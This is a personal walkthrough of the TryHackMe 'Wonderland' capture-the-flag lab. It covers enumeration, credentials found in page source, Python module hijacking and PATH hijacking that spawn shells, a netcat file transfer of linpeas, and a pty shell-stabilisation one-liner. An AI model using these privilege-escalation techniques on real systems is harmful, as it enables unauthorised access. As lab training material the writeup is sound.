---
title: "Wonderland machine tryhackme writeup"
excerpt_separator: "<!--more-->"
date: 2023-10-28
categories:
  - TryHackMe Writeups
tags:
  - Hacking
  - Notes
  - writeup
  - ctf
---

### Wonderland — TryHackMe Walkthrough

- *My writeups are more of my own mind-map than an "official" walkthrough, it may not seem straightforward sometimes but that's just the beauty of my own thinking.*

## Foothold:

- the website had a simple picture of a rabbit, i downloaded it to analyze it with Exif —-TAKEAWAY Exif is for metadata , steghide is for any hidden messages inside the images.
- using nmap as usual, only two ports were open ssh and http.
- next i used gobuster for enumeration i found a directory **/r**, i checked it and it’s a page with a text it’s like hints for the next step so my instinct was that its **/r/a/b/b/i/t** since the first web page said to follow the rabbit ***literally*** 😉
- after this i got stuck tbh there was nothing to do but i forgot to check the source code and the next hint was there ***alice ssh credentials.***
- after connecting to ssh with those credentials there was a python script.

***the attack vector:***
- the script basically gives random poem lines BUT it uses the library [random.py](http://random.py) so ***TRICK 1*** check the path python uses to look for random lib using:

```python
python3 -c 'import sys; print (sys.path)'
```

- it first checks the directory the script is in then go for the python libs default directory and bingo. so all we had to do is create a fake [random.py](http://random.py) that gives us a bash into the rabbit user using:

```python
import os

os.system("/bin/bash")
```

- after doing ***sudo -u rabbit /usr/bin/python3.6 /home/alice/script.py*** - we’re in with rabbit.
- rabbit has a teaParty file after executing it, it gives a segmentation error, after checking with ghidra or IDA we see that it uses the functions **date** and **echo** from **/bin** using a relative linux path.
- ***TRICK 2***  we have a write acces into /tmp so we could create a "date" bash script including this :

```bash
#!/bin/bash

/bin/bash
```

- after "chmod 777 date" we add the **/tmp** to PATH using **export PATH=/tmp:$PATH**
- that’s crucial to add it at the start of the PATH.
- going back to teaParty execution and boom we’re the user hatter, we take the ssh password from the directory then connect to hatter properly through ssh.
- i guess using **linpeas** was essential to find the vulnerable parameter which was related to perl, to transfer linpeas into the victim machine i learnt this ***TRICK 3 :***

```bash
#Victim machine first
nc -lvnp 9200 > linpeas.sh
```

```bash
# My machine
nc @Victim_ip 9200 < linpeas.Sh
```

- after finding the vulnerable point we escalate to root, stabilize the terminal using ***python3 -c ‘import pty; pty.spawn(”/bin/bash”)’***  and look for user.txt and root.txt and ***VOILA***